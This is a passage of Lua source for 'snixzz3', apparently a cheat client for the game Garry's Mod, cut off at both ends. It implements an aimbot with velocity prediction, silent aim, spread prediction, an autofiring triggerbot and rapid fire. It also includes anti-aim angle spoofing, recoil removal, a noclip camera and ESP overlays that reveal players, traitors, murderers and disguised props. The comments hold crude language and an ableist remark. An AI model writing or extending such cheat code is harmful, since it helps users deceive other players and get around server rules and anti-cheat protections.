				tPos = snixzz.GetPredictionPos( v, Pos ) - Pos
				Pos = Pos + ( tPos * 2 ) - ( lVelocity / 50 )
			
			elseif snixzz.Vars["aim_prediction_method"] == "ColdFire" then
			
				Pos = Pos - tVelocity:GetNormal() / 5.8 + lVelocity:GetNormal() / 3
				
			elseif snixzz.Vars["aim_prediction_method"] == "FapHack" then
				
				Pos = Pos + tVelocity * 0.02 - lVelocity * 0.05
				
			elseif snixzz.Vars["aim_prediction_method"] == "fr1kin" then
			
				local targetFrames = RealFrameTime() / 25
				local plyFrames = RealFrameTime() / 66
				
				Pos = Pos + ( ( tVelocity * targetFrames ) - ( tVelocity * plyFrames ) ) - ( ( lVelocity * targetFrames ) + ( lVelocity * plyFrames ) )
				
			elseif snixzz.Vars["aim_prediction_method"] == "Dismay" then

				local vel = v:GetVelocity()
				
				local i = math.max( interp:GetFloat(), interp_ratio:GetFloat() / updaterate:GetFloat() )
				
				if v:IsOnGround() then
					
					vel.z = vel.z - sv_gravity:GetFloat() * 0.5 * FrameTime()
					
					vel.z = vel.z + v:GetVelocity().z * FrameTime()
					
				end
				
				Pos = Pos + vel * ( engine.TickInterval() * i )											
				
			elseif snixzz.Vars["aim_prediction_method"] == "Ampris" then

				shootPos = G.LocalPlayer():GetShootPos() + G.LocalPlayer():GetVelocity() * G.engine.TickInterval()
				ply_Frames = RealFrameTime() / 66
				targ_Frames = RealFrameTime() / 25
				
				Pos = Pos + ( tVelocity * ( targ_Frames ) - ( lVelocity * ( ply_Frames ) ) )
				
			elseif snixzz.Vars["aim_prediction_method"] == "Turbobot" then

				Pos = Pos + tVelocity * ( 1 / 66 ) - lVelocity * ( 1 / 66 )
					
			elseif snixzz.Vars["aim_prediction_method"] == "Faphack Old" then
			
				Pos = ( Pos - Vector( 0, 0, lVelocity:Length() / 250 ) ) + ( tVelocity * 0.0087 ) - ( lVelocity * 0.0087 )				
				
			end	
			
		end
		
	end
	
	return Pos
end

function snixzz.GetTarget()
	
	local x, y = G.ScrW(), G.ScrH()
	local vPos
	local oldPos = G.LocalPlayer():EyePos():ToScreen()
	local distance = G.math.huge
	local AngA
	local AngB
	//local target
	
	local Method
	
	if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
		
		Method = G.ents.GetAll()
	
	elseif snixzz.Vars["aim_target_type"] == "NPC" then
		
		Method = G.ents.GetAll() 
		
	elseif snixzz.Vars["aim_target_type"] == "Players" then
	
		Method = G.player.GetAll()

	elseif snixzz.Vars["aim_target_type"] == "Both" then

		Method = G.ents.GetAll()
		
	end
	
	for k, v in G.next, Method do
	
		distance2 = v:GetPos():DistToSqr( G.LocalPlayer():GetPos() )

		if snixzz.IsValid( v, "Aimbot" ) then
		
			if snixzz.Vars["aim_target_method"] == "Distance" then
				
				if distance2 < distance then
				
					distance = distance2
					
					return v
				
				end
				
			elseif snixzz.Vars["aim_target_method"] == "Crosshair" then
			
				vPos = v:GetPos():ToScreen()
				AngA = G.math.Dist( x / 2, y / 2, oldPos.x, oldPos.y )
				AngB = G.math.Dist( x / 2, y / 2, vPos.x, vPos.y )
			
				if AngB <= AngA then
				
					return v
					
				end
				
			end	
			
		else
		
			continue
			
		end
		
	end
	
	return nil
end

snixzz.Firing = false
function snixzz.Fire( ucmd )

	if snixzz.Firing then
	
		ucmd:RemoveKey( G.IN_ATTACK )
		snixzz.Firing = false
		
	else
	
		ucmd:SetButtons( G.bit.bor( ucmd:GetButtons(), G.IN_ATTACK ) )
		snixzz.Firing = true
		
	end
	
end

snixzz.SpammingDoor = false
function snixzz.SpamDoor( ucmd )

	if snixzz.SpammingDoor then
	
		ucmd:RemoveKey( G.IN_USE )
		snixzz.SpammingDoor = false
		
	else
	
		ucmd:SetButtons( G.bit.bor( ucmd:GetButtons(), G.IN_USE ) )
		snixzz.SpammingDoor = true
		
	end
	
end


snixzz.FakeSwitch = false
snixzz.FakeAngle = G.Angle()
snixzz.AntiAimMethods = { "Classic", "Classic Inverted", "Static", "Jitter", "Random Pitch",/* "Fake Angles", "Fake Jitter", */"Spin", /*"Fake Spin"*/ }
function snixzz.AntiAim( ucmd )

	local pitches = { -181, 541, 262 }
	local yaws = { 262, -262, 181, -181, 541, -541 }
	
	-- OG anti-aim
	if snixzz.Vars["aim_anti_method"] == "Classic" then
		
		snixzz.Functions.SetViewAngles( ucmd, G.Angle( 181, ucmd:GetViewAngles().y, 180 ) )
		snixzz.FixMove( ucmd )
		
	-- Looking down instead of up
	elseif snixzz.Vars["aim_anti_method"] == "Classic Inverted" then
		
		snixzz.Functions.SetViewAngles( ucmd, G.Angle( -181, ucmd:GetViewAngles().y, 180 ) )
		snixzz.FixMove( ucmd )
		
	-- Static
	elseif snixzz.Vars["aim_anti_method"] == "Static" then
		
		snixzz.Functions.SetViewAngles( ucmd, G.Angle( -snixzz.Angles.p + 900, snixzz.Angles.y + 180, 0 ) )
		snixzz.FixMove( ucmd, true )
		
	-- Jitter - credits to cdriza
	elseif snixzz.Vars["aim_anti_method"] == "Jitter" then
		
		snixzz.Functions.SetViewAngles( ucmd, G.Angle( G.table.Random( pitches ), G.table.Random( yaws ), 0 ) )
		snixzz.FixMove( ucmd, true )
		
	-- Randomized pitch
	elseif snixzz.Vars["aim_anti_method"] == "Random Pitch" then
	
		snixzz.Functions.SetViewAngles( ucmd, G.Angle( G.math.random( -180, -186.49999 ), ucmd:GetViewAngles().y, 180 ) )
		snixzz.FixMove( ucmd )
		
	-- bSendPacket Fake Angles
	/*elseif snixzz.Vars["aim_anti_method"] == "Fake Angles" then
		
		snixzz.FakeAngle = ucmd:GetViewAngles()
		
		if snixzz.FakeSwitch then
			
			bSendPacket = true
			//snixzz.Functions.SendPacket( true )
			snixzz.Functions.SetViewAngles( ucmd, G.Angle( -192, snixzz.FakeAngle.y + 90, 0 ) )
		
		else
			
			bSendPacket = false			
			snixzz.Functions.SetViewAngles( ucmd, G.Angle( -192, snixzz.FakeAngle.y - 90, 0 ) )
		
		end
		
		snixzz.FixMove( ucmd, true )
		snixzz.FakeSwitch = !snixzz.FakeSwitch
	
	-- bSendPacket Fake Jitter
	elseif snixzz.Vars["aim_anti_method"] == "Fake Jitter" then
		
		snixzz.FakeAngle = ucmd:GetViewAngles()
		
		if snixzz.FakeSwitch then
			
			bSendPacket = true
			snixzz.Functions.SetViewAngles( ucmd, G.Angle( G.math.random( -180, -186.49999 ), snixzz.FakeAngle.y + 90, 0 ) )
		
		else
			
			bSendPacket = false			
			snixzz.Functions.SetViewAngles( ucmd, G.Angle( G.math.random( -180, -186.49999 ), snixzz.FakeAngle.y - 90, 0 ) )
		
		end
		
		snixzz.FixMove( ucmd, true )
		snixzz.FakeSwitch = !snixzz.FakeSwitch
		
	*/
		
	-- Simple spinbot with -192 pitch
	elseif snixzz.Vars["aim_anti_method"] == "Spin" then
		
		snixzz.Functions.SetViewAngles( ucmd, ucmd:GetViewAngles() + G.Angle( 0, G.math.fmod( G.CurTime() / .1 * 2 * snixzz.Vars["aim_anti_spin_speed"], 360 ), 0 ) )
		snixzz.FixMove( ucmd, false )
	
	-- bSendPacket Spinbot
	/*elseif snixzz.Vars["aim_anti_method"] == "Fake Spin" then
		
		snixzz.FakeAngle = ucmd:GetViewAngles()
		
		if FakeSwitch then
			
			bSendPacket = true			
			snixzz.Functions.SetViewAngles( ucmd, ucmd:GetViewAngles() + G.Angle( 0, G.math.fmod( G.CurTime() / .1 * 2 * snixzz.Vars["aim_anti_spin_speed"], 360 ), 0 ) )
		
		else
			
			bSendPacket = false
			snixzz.Functions.SetViewAngles( ucmd, ucmd:GetViewAngles() + G.Angle( 0, -G.math.fmod( G.CurTime() / .1 * 2 * snixzz.Vars["aim_anti_spin_speed"], 360 ), 0 ) )
		
		end
		
		snixzz.FixMove( ucmd, false )
	*/
	end
	
end

-- To shorten up my aimbot checks a bit.
function snixzz.ShouldAim( ucmd, isToggled )
	
	if snixzz.Bools["aim_canfire"] && !snixzz.CanFire() then
		
		return false
		
	end
	
	return snixzz.Target && snixzz.IsValid( snixzz.Target, "Aimbot" ) && ucmd:CommandNumber() != 0// && snixzz.CanFire()	
	
end

function snixzz.InMenu()

	return snixzz.Typing or snixzz.ChatboxOpen or G.gui.IsConsoleVisible() or G.gui.IsGameUIVisible()

end

local bind, key
function snixzz.DoBind( str )
	
	//if snixzz.ChatOpen or snixzz.Typing then return false end
	
	if snixzz.InMenu() then return false end
	
	if str == "+aimbot" && snixzz.Bools["aim_toggle"] then return true end
	
	if str == "+triggerbot" && snixzz.Bools["misc_triggerbot"] then return true end
	
	bind = snixzz.Binds[str]
	
	key = input.GetKeyName( bind )
	
	if string.find( key:lower(), "mouse" ) then
	
		if input.IsMouseDown( bind ) then
			
			return true
			
		end
		
	else
	
		if input.IsKeyDown( bind ) then 
			
			return true
			
		end
	
	end

	return false

end

/*=======================


Hooked functions below


=========================*/
snixzz.Status = "Waiting..."
snixzz.StatusColor = Color( 255, 255, 0, 150 )
snixzz.Silent = G.Angle()
snixzz.BulletTime = true
snixzz.StuckSwitch = false
snixzz.StuckTicks = 0
snixzz.pDelay = 0
snixzz.NoSpreadAngle = G.Angle()
//snixzz.SpreadPos = G.Vector( 0, 0, 0 )

local plsbeDoor
function snixzz.CreateMove( ucmd )

	-- cl noclip
	if snixzz.Bools["misc_csnoclip"] then
	
		ucmd:SetForwardMove( 0 )
		ucmd:SetUpMove( 0 )
		ucmd:SetSideMove( 0 )
		
	end
	
	-- Doorspam
	if snixzz.Bools["misc_doorspam"] then
	
		plsbeDoor = G.LocalPlayer():GetEyeTrace().Entity
		
		if IsValid( plsbeDoor ) && plsbeDoor:GetClass() == "func_door" or plsbeDoor:GetClass() == "prop_door_rotating" then
		
			snixzz.SpamDoor( ucmd )
		
		end
	
	end	

	// Silent aim
	snixzz.Silent = snixzz.Silent + G.Angle( ucmd:GetMouseY() * 0.022, -ucmd:GetMouseX() * 0.022, 0 )
	snixzz.Silent.p = G.math.Clamp( snixzz.Silent.p, -89, 89 )
	snixzz.Silent.y = G.math.NormalizeAngle( snixzz.Silent.y )
	
	ucmd:SetViewAngles( snixzz.Silent ) 

	if ucmd:CommandNumber() == 0 then

		return
	end		
	
	if !snixzz.Bools["aim_holdtarget"] then 
		
		snixzz.Target = snixzz.GetTarget()
		
	end
	
	snixzz.Offset = G.Vector( 0, 0, snixzz.Vars["aim_offset"] )
			
	snixzz.Angles = snixzz.Silent
	
	// Aimbot core
	//if ( snixzz.Binds["+aimbot"] != nil && G.input.IsKeyDown( snixzz.Binds["+aimbot"] ) && !snixzz.ChatboxOpen && !snixzz.Typing or snixzz.Bools["aim_toggle"] ) then
	if snixzz.DoBind( "+aimbot" ) then
		
		if snixzz.Bools["aim_holdtarget"] then
		
			if snixzz.Target == nil or snixzz.Target != nil && !snixzz.IsValid( snixzz.Target, "Aimbot" ) then
			
				snixzz.Target = snixzz.GetTarget()
			 
			end
			
		end
		
		if snixzz.ShouldAim( ucmd, snixzz.Bools["aim_toggle"] ) then
		
			snixzz.Angles = snixzz.GetPos( snixzz.Target ) + snixzz.Offset
			
			if snixzz.Bools["aim_prediction"] then
				
				snixzz.Angles = snixzz.Prediction( snixzz.Angles, snixzz.Target )
				
			end
				
			snixzz.Angles = ( snixzz.Angles - G.LocalPlayer():GetShootPos() ):Angle()	
			
			-- Spread Prediction
			if snixzz.Bools["aim_nospread"] then
			
				if snixzz.Bools["aim_badshots"] then
					
					if G.math.random( 1, 5 ) == 1 then
					
						snixzz.Angles = snixzz.Angles // eeeeeeeeeeeeeeeeeeeeee
						
					else
		
						snixzz.Angles = snixzz.PredictSpread( ucmd, G.Angle( snixzz.Angles.p, snixzz.Angles.y, 0 ) )
						
					end
					
				else
					
					snixzz.Angles = snixzz.PredictSpread( ucmd, G.Angle( snixzz.Angles.p, snixzz.Angles.y, 0 ) )
					
				end
				
			end	
			
			snixzz.Angles = snixzz.NormalizeAngles( snixzz.Angles )
			
			-- Set angles
			snixzz.Functions.SetViewAngles( ucmd, snixzz.Angles )	

			-- autofire
			if snixzz.Bools["aim_autoshoot"] then
				
				snixzz.Fire( ucmd )		
				
			end
			
			-- Silent aim view & move correction
			if snixzz.Bools["aim_silent"] then
				
				snixzz.FixMove( ucmd )
				
			else
				
				snixzz.Silent = snixzz.Angles
				
			end
				
			-- ghetto aimbot status
			if snixzz.Target:IsPlayer() then
			
				snixzz.Status = "Locked! (" .. snixzz.Target:Nick() .. ")"
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Locked = true
				
			elseif snixzz.Target:IsNPC() then
				
				snixzz.Status = "Locked! (" .. snixzz.Target:GetModel() .. ")"
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Locked = true
				
			elseif snixzz.IsProphunt && snixzz.IsProp( snixzz.Target ) && snixzz.IsProp( snixzz.Target ) then
				
				snixzz.Status = "Locked! (" .. snixzz.Target:GetOwner():Name() .. ")"
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Locked = true

			end
							
		else
			
			snixzz.Target = nil
			snixzz.Status = ""
			snixzz.StatusColor = Color( 0, 255, 0, 150 )
			snixzz.Locked = false	
		
		end
	
	else
		
		snixzz.Target = nil
		snixzz.Status = ""
		snixzz.StatusColor = Color( 0, 255, 0, 150 )
		snixzz.Locked = false	
	
	end
	
	-- Rapid-Fire
	if snixzz.Bools["misc_rapidfire"] && ucmd:KeyDown( IN_ATTACK ) && !snixzz.Locked then
		
		snixzz.Fire( ucmd )
		
	end
	
	-- Constant NoSpread
	if snixzz.Bools["aim_constant_nospread"] then
	
		snixzz.SpreadHitPos = G.LocalPlayer():GetEyeTrace().HitPos
		snixzz.NoSpreadAngle = ( snixzz.SpreadHitPos - G.LocalPlayer():GetShootPos() ):GetNormal():Angle()
		snixzz.NoSpreadAngle = snixzz.PredictSpread( ucmd, ucmd:GetViewAngles() )
		
		if !snixzz.Locked && ucmd:KeyDown( IN_ATTACK ) then
			
			snixzz.NoSpreadAngle.p = math.NormalizeAngle( snixzz.NoSpreadAngle.p )
			snixzz.NoSpreadAngle.y = math.NormalizeAngle( snixzz.NoSpreadAngle.y )
			
			snixzz.Functions.SetViewAngles( ucmd, snixzz.NoSpreadAngle )
			
		end
		
	end
	
	-- Triggerbot
	//if snixzz.Binds["+triggerbot"] != nil && snixzz.Bools["misc_triggerbot"] or G.input.IsKeyDown( snixzz.Binds["+triggerbot"] ) then
	if snixzz.DoBind( "+triggerbot" ) then
		
		snixzz.StatusColor = Color( 255, 255, 0, 150 )
		snixzz.Status = "Triggerbot Searching.."
		local hitgroup = G.LocalPlayer():GetEyeTrace().HitGroup
		local entity = G.LocalPlayer():GetEyeTrace().Entity
		snixzz.SpreadPos = G.LocalPlayer():GetEyeTrace().HitPos
		
		if snixzz.Vars["misc_triggerbot_type"] == "NPC" or snixzz.Vars["misc_triggerbot_type"] == "Both" && entity:IsNPC() then
			
			if snixzz.IsValid( entity, "Triggerbot" ) then
				
				if snixzz.Bools["aim_nospread"] or snixzz.Bools["aim_constant_nospread"] then
					
					snixzz.NoSpreadAng = snixzz.PredictSpread( ucmd, ( snixzz.SpreadPos - G.LocalPlayer():GetShootPos() ):GetNormal():Angle() )
					snixzz.Functions.SetViewAngles( ucmd, snixzz.NoSpreadAng )
					
				end
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Status = "Firing! (" .. entity:GetModel() .. ")"
			
				snixzz.Fire( ucmd )
				
			end
		
		elseif snixzz.Vars["misc_triggerbot_method"] == "Body" then
			
			if snixzz.IsValid( entity, "Triggerbot" ) then
								
				if snixzz.Bools["aim_nospread"] or snixzz.Bools["aim_constant_nospread"] then
					
					snixzz.NoSpreadAng = snixzz.PredictSpread( ucmd, ( snixzz.SpreadPos - G.LocalPlayer():GetShootPos() ):GetNormal():Angle() )
					snixzz.Functions.SetViewAngles( ucmd, snixzz.NoSpreadAng )
					
				end
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Status = "Firing! (" .. entity:Nick() .. ")"
			
				snixzz.Fire( ucmd )
				
			end
			
		elseif snixzz.Vars["misc_triggerbot_method"] == "Hitbox" then
			
			if snixzz.Hitgroups[hitgroup] != nil && snixzz.IsValid( entity, "Triggerbot" ) then
								
				if snixzz.Bools["aim_nospread"] or snixzz.Bools["aim_constant_nospread"] then
					
					snixzz.NoSpreadAng = snixzz.PredictSpread( ucmd, ( snixzz.SpreadPos - G.LocalPlayer():GetShootPos() ):GetNormal():Angle() )
					snixzz.Functions.SetViewAngles( ucmd, snixzz.NoSpreadAng )
					
				end
				
				snixzz.StatusColor = Color( 255, 0, 0, 150 )
				snixzz.Status = "Firing! (" .. entity:Nick() .. ")"
				
				snixzz.Fire( ucmd ) 
				
			end
			
		end
		
	end
	
	-- Anti-Aim
	if snixzz.Bools["aim_anti"] && !snixzz.Locked && !ucmd:KeyDown( IN_ATTACK ) && !ucmd:KeyDown( IN_USE ) && G.LocalPlayer():GetMoveType() != MOVETYPE_LADDER then
		
		snixzz.AntiAim( ucmd )
		
	end	
	
	// Bunnyhop & autostrafe
	if snixzz.Bools["misc_bhop"] then
		
		if !G.LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP && G.LocalPlayer():GetMoveType() != MOVETYPE_LADDER && !snixzz.Typing then		
			
			if !G.LocalPlayer():OnGround() && ucmd:KeyDown( IN_JUMP )then				
				
				ucmd:SetButtons( G.bit.band( ucmd:GetButtons(), G.bit.bnot( IN_JUMP ) ) )
				
				-- Autostrafe shamelessly ripped from "public hvh v1".
				-- i don't understand this shit.
				if snixzz.Bools["misc_autostrafe"] then
					
					if ucmd:GetMouseX() > 1 or ucmd:GetMouseX() < - 1 then
						
						ucmd:SetSideMove( ucmd:GetMouseX() > 1 && 400 or -400 )
						
					else
						
						ucmd:SetForwardMove( 5850 / G.LocalPlayer():GetVelocity():Length2D() )
						ucmd:SetSideMove( ( ucmd:CommandNumber() % 2 == 0 ) && -400 or 400 ) -- what the fuck. who thought of this shit.
						
					end
					
				end
				
			elseif ucmd:KeyDown( IN_JUMP ) && snixzz.Bools["misc_autostrafe"] then
				
				ucmd:SetForwardMove( 10000 )
							
			end			
			
		end		
		
	end

end

snixzz.CSNoclipPos = {}
function snixzz.CalcView( ply, origin, angles, fov )

	local ply = G.LocalPlayer()
	local wep = ply:GetActiveWeapon()
	local noclipSpeed = snixzz.Vars["misc_csnoclip_speed"] * ( FrameTime() / 2 ) * 100
	local view = {}
		
	// Advanced NoRecoil. TODO: Recoil Control System
	if snixzz.Bools["aim_norecoil"] then
		
		if wep.Primary then
		
			wep.Primary.Recoil = 0
			
		elseif wep.Secondary then
			
			wep.Secondary.Recoil = 0
			
		end
		
	else
	
		if wep.Primary then

			wep.Primary.Recoil = snixzz.RecoilBackup[wep:GetClass()]
			
		else
		
			if wep.Secondary then
			
				wep.Secondary.Recoil = snixzz.RecoilBackup[wep:GetClass()]
				
			end
			
		end
		
	end
		
	if snixzz.Bools["misc_csnoclip"] && snixzz.CSNoclipPos then

		local ang = snixzz.Silent:Forward()
		
		if LocalPlayer():KeyDown( IN_FORWARD ) then
			
			snixzz.CSNoclipPos = snixzz.CSNoclipPos + LocalPlayer():GetAimVector() * noclipSpeed
			
		end
		
		if LocalPlayer():KeyDown( IN_BACK ) then
			
			snixzz.CSNoclipPos = snixzz.CSNoclipPos - LocalPlayer():GetAimVector() * noclipSpeed
			
		end
		
		if LocalPlayer():KeyDown( IN_MOVERIGHT ) then
			
			snixzz.CSNoclipPos = snixzz.CSNoclipPos + ang:Angle():Right() * noclipSpeed
			
		end
		
		if LocalPlayer():KeyDown( IN_MOVELEFT ) then
			
			snixzz.CSNoclipPos = snixzz.CSNoclipPos - ang:Angle():Right() * noclipSpeed
			
		end

	else 
		
		snixzz.CSNoclipPos = LocalPlayer():EyePos()
		
	end
	
	view.angles = ( snixzz.Bools["aim_silent"] or snixzz.Bools["aim_anti"] ) && snixzz.Silent or angles
		
	view.fov = snixzz.Vars["esp_fov"]
	
	//view.origin = snixzz.Bools["misc_thirdperson"] && ( origin - snixzz.Silent:Forward() * snixzz.Vars["misc_thirdperson_distance"] ) or origin
	
	if snixzz.Bools["misc_thirdperson"] then
		
		view.origin =  origin - snixzz.Silent:Forward() * snixzz.Vars["misc_thirdperson_distance"] or origin
		
	elseif snixzz.Bools["misc_csnoclip"] then
		
		view.origin = snixzz.CSNoclipPos
		
	else
		
		view.origin = origin
		
	end

	return view	
end

-- Autism as FUCK
function snixzz.Color( col )

	if snixzz.Bools["esp_rainbow"] then
		
		return G.HSVToColor( RealTime() * 120 % 360, 1, 1 )

	end
		
	return col

end

// GetColor func
function snixzz.GetESPColor( v )
	
	if snixzz.Bools["misc_murder_finder"] && snixzz.IsMurder then
		
		if snixzz.IsMurderer( v ) then
		
			return G.Color( 255, 0, 0 )
			
		elseif snixzz.HasMagnum( v ) then
			
			return G.Color( 0, 255, 255 )
			
		else 
			
			return G.Color( 0, 255, 0 )
			
		end
		
	elseif snixzz.Bools["misc_prophunt_finder"] && snixzz.IsProphunt then
		
		if snixzz.IsProp( v ) then
			
			return G.Color( 255, 0, 0 )
			
		else
		
			return G.Color( 0, 255, 0 )
			
		end
		
	end
	
	if v:IsNPC() then
		
		return G.Color( 0, 255, 0 )
		
	end
	
	if snixzz.Entities[v:GetClass()] then
		
		return G.Color( 255, 255, 255 )
		
	end
	
	if v:GetFriendStatus() == "friend" then
		
		return G.HSVToColor( RealTime() * 120 % 360, 1, 1 )
	
	end
	
	if snixzz.Bools["misc_traitor_finder"] && snixzz.IsTTT && snixzz.IsTraitor( v ) then
		
		return G.Color( 255, 0, 0 )
		
	else
		
		return snixzz.Color( G.team.GetColor( v:Team() ) )
	
	end
	
	return G.Color( 255, 255, 255 )
	
end

local laserMat = G.Material( "trails/laser" )
local hitposMat = G.Material( "Sprites/light_glow02_add_noz" )
function snixzz.HUDPaint()

	local textpos;
	local x1, y1, x2, y2;
	local diff;
	local diff2;
	local color;
	local startx;
	local starty;
	local endpos;
	local pos;
	local wep = G.LocalPlayer():GetActiveWeapon()
	local viewmodel = G.LocalPlayer():GetViewModel()		
	local weapon
	local dynLight
	local playerPos
	local targetPos
	
	if snixzz.Bools["esp_radar"] then
	
		
	
	end
	
	-- Menu header
	if snixzz.MenuOpen then
		
		G.surface.SetDrawColor( snixzz.Color( snixzz.Vars["misc_menucolor2"] ) )
		G.surface.DrawRect( 20, 50, 420, 60 )
		
		G.surface.SetDrawColor( Color( 0, 0, 0, 255 ) )
		G.surface.DrawOutlinedRect( 20, 50, 420, 60, 2 )		

		G.draw.SimpleTextOutlined( "snixzz3", "snixzz_logo", 25, 55, snixzz.Color( snixzz.Colors.White ), TEXT_ALIGN_LEFT,TEXT_ALIGN_LEFT, 1.5, Color( 0, 0, 0 ) )
		--G.draw.SimpleTextOutlined( "by 0xymoron", "snixzz_logo_small", G.surface.GetTextSize( "snixzz3" ) + 30, 65, snixzz.Color( snixzz.Colors.White ), TEXT_ALIGN_LEFT,TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0 ) )
		
		-- Is VIP?
		G.draw.SimpleTextOutlined( "VIP:", "snixzz_logo_small", 
			//190, 65, 
			snixzz.Frame:GetWide() / 2 - surface.GetTextSize( "VIP:" ) / 2, 65,
			snixzz.Colors.White, TEXT_ALIGN_LEFT,TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0 ) 
		)		
		
		-- Texture
		G.surface.SetMaterial( Material( snixzz.IsVIP() == true && "icon16/accept.png" or snixzz.IsVIP() == false && "icon16/cancel.png" ) )
		G.surface.SetDrawColor( color_white )
		G.surface.DrawTexturedRect( snixzz.Frame:GetWide() / 2 - surface.GetTextSize( "VIP:" ) / 2 + 22, 65, 16, 16 )
		
		-- Big ass shit
		G.draw.SimpleTextOutlined( 
			snixzz.Info.Version .. "   Last Updated: " .. snixzz.Info.Updated, 
			"snixzz_logo_small", 
			snixzz.Frame:GetWide() + 15, snixzz.Frame:GetTall() - 352,
			snixzz.Colors.White, TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM, 1, Color( 30, 30, 30, 255 ) 
		)
		
	end
	
	-- Menu opening
	if snixzz.DoBind( "+menu" ) && !snixzz.MenuOpen then
			
		snixzz.Menu()
		snixzz.MenuOpen = true
			
	end
	
	-- Console Opening
	if G.input.IsKeyDown( KEY_Q ) && G.input.IsKeyDown( KEY_TAB ) && !snixzz.ConsoleOpen && !snixzz.InMenu() then
		
		snixzz.Console()
		snixzz.ConsoleOpen = true
		
	end
	
	-- Chat opening
	if !snixzz.ChatboxOpen then

		if snixzz.DoBind( "chat" ) then
			
			snixzz.OpenChat()
			snixzz.ChatboxOpen = true
			
		end
		
	end	
	
	if snixzz.Panic then return end
	if !snixzz.Bools["esp_enabled"] then return end
	
	-- Watermark
	if !snixzz.IsVIP() then
	
		G.draw.SimpleTextOutlined( "snixzz3 " .. snixzz.Info.Version .. " - snixzz.net", "snixzz_logo", G.ScrW() - 10, 25, G.HSVToColor( G.RealTime() * 120 % 360, 1, 1 ), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM, 1, G.Color( 0, 0, 0 ) )
	
	end
	
	-- Laser Sight
	if snixzz.Bools["esp_laser"] then
					
		if viewmodel && G.IsValid( wep ) && G.IsValid( viewmodel ) then
			
			if wep:GetClass() != "weapon_physgun" then
						
				local muzzle = viewmodel:LookupAttachment( "muzzle" )
				
				if muzzle == 0 then
					
					muzzle = viewmodel:LookupAttachment( "1" )
			
				end
							
				local trace = G.LocalPlayer():GetEyeTrace().HitPos
							
				if viewmodel:GetAttachment( muzzle ) then						
					
					G.cam.Start3D( G.EyePos(), G.EyeAngles() )
									
						local startpos = viewmodel:GetAttachment( muzzle ).Pos						
						local endpos = trace	
									
						if snixzz.Bools["aim_silent"] && snixzz.Locked && G.IsValid( snixzz.Target ) then
							
							endpos = snixzz.GetPos( snixzz.Target )
							
						else
							
							endpos = trace
							
						end
									
						-- Laser
						G.render.SetMaterial( laserMat )													
						G.render.DrawBeam( startpos, endpos, 4, 0, 0, snixzz.Color( snixzz.Vars["misc_lasercolor"] ) )
								
						-- HitPos Dot
						G.render.SetMaterial( hitposMat )
						
							G.render.DrawQuadEasy( 
							endpos, -- trace
							( G.EyePos() - trace ):GetNormal(), 
							25, 25, 
							Color( 255, 255, 255, 255 ), 0 
							
						)
								
					G.cam.End3D()
					
				end
				
			end
			
		end
		
	end

	-- Dynamic Light around player
	if snixzz.Bools["esp_dynamiclight"] then
	
		dynLight = G.DynamicLight( G.LocalPlayer():EntIndex() )
		dynLight.pos = G.LocalPlayer():GetShootPos()
		dynLight.r = 255
		dynLight.g = 255
		dynLight.b = 255
		dynLight.brightness = 1.75
		dynLight.Decay = 850
		dynLight.Size = 250
		dynLight.DieTime = G.CurTime() + 1
		
	end
	
	if G.IsValid( viewmodel ) then
	
		if snixzz.Bools["esp_wireweapon"] then
			
			_R.Entity.SetMaterial( viewmodel, "models/wireframe" )
			_R.Entity.SetColor( viewmodel, snixzz.Color( snixzz.Vars["misc_lasercolor"] ) )
			
		else
		
			_R.Entity.SetMaterial( viewmodel, "" )
			_R.Entity.SetColor( viewmodel, Color( 255, 255, 255 ) )
			
		end
		
	end
	
	local Method
	
	if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
		
		Method = G.ents.GetAll()
	
	elseif snixzz.Vars["esp_type"] == "NPC" or snixzz.Vars["esp_type"] == "All" or snixzz.Vars["esp_type"] == "Entities" then
		
		Method = G.ents.GetAll()
		
	elseif snixzz.Vars["esp_type"] == "Players" then
		
		Method = G.player.GetAll()
		
	end
			
	for k, v in G.next, Method do
		
		if snixzz.IsValid( v, "ESP" ) then	

			textpos = 0 -- -2
			
			x1, y1, x2, y2 = snixzz.GetBounds( v )
			diff = G.math.abs( x2 - x1 )
			diff2 = G.math.abs( y2 - y1 )
			
			playerPos = snixzz.GetPos( v )
			color = snixzz.GetESPColor( v )	

			if v:IsPlayer() or v:IsNPC() then
				
				if G.IsValid( v:GetActiveWeapon() ) then
					
					weapon = v:GetActiveWeapon():GetPrintName()
					
				else
					
					weapon = "Unknown"
					
				end		
				
			else
				
				weapon = "nil"
				
			end
				
			if v:IsPlayer() or snixzz.IsProphunt && snixzz.IsProp( v ) then
				
				if snixzz.IsMurder then
				
					if snixzz.Bools["esp_name"] then
						
						G.draw.SimpleText( v:GetBystanderName() .. " (" .. v:Nick() .. ")", "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
						textpos = textpos + 12
						
					end
				
				elseif snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
					
					if snixzz.IsProp( v ) then
					
						G.draw.SimpleText( v:GetOwner():Name(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
						textpos = textpos + 12
					
					elseif v:Team() != TEAM_PROPS && v:GetClass() != "ph_prop" then
					
						G.draw.SimpleText( v:Nick(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
						textpos = textpos + 12
					
					end
					
				else
				
					if snixzz.Bools["esp_name"] then
						
						G.draw.SimpleText( v:Nick(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
						textpos = textpos + 12
						
					end
					
				end
				
			elseif v:IsNPC() then
				
				G.draw.SimpleText( v:GetModel(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
				textpos = textpos + 12
				
			elseif snixzz.Entities[v:GetClass()] then
			
